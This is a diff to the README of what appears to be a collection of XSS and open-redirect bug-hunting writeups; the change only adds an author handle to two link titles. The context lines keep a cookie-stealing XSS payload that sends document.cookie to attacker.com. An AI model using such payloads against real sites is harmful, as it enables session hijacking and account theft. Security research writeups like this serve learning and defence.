@@ -32,7 +32,7 @@ This repository serves as a collection of insightful and informative blog posts 
 
   ``<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>``
 
-- **[Humorous XSS Vulnerabilities in a Movie Website](https://medium.com/meetcyber/humorous-xss-vulnerabilities-in-a-movie-website-3600d7828661)**
+- **[Humorous XSS Vulnerabilities in a Movie Website @erkankavas](https://medium.com/meetcyber/humorous-xss-vulnerabilities-in-a-movie-website-3600d7828661)**
 
   The system’s logic involves creating a new list from the “Create New List” section in the user profile, naming it, and then adding movies and TV series to curate a personalized list.
 
@@ -47,7 +47,7 @@ This repository serves as a collection of insightful and informative blog posts 
     </script>
   ```
 
-- **[A New Bug Hunting Story: Open Redirection Vulnerability](https://medium.com/meetcyber/a-new-bug-hunting-story-open-redirection-vulnerability-33a1b6374f88)**
+- **[A New Bug Hunting Story: Open Redirection Vulnerability @erkankavas](https://medium.com/meetcyber/a-new-bug-hunting-story-open-redirection-vulnerability-33a1b6374f88)**
 
   Open redirection bugs generally occur in areas designed to redirect users automatically after completing a form or triggering an action, such as through parameters like refURL, returnURL, followURL. These vulnerabilities can be exploited to      manipulate users into being redirected to a malicious site after completing legitimate actions on the real website.
 
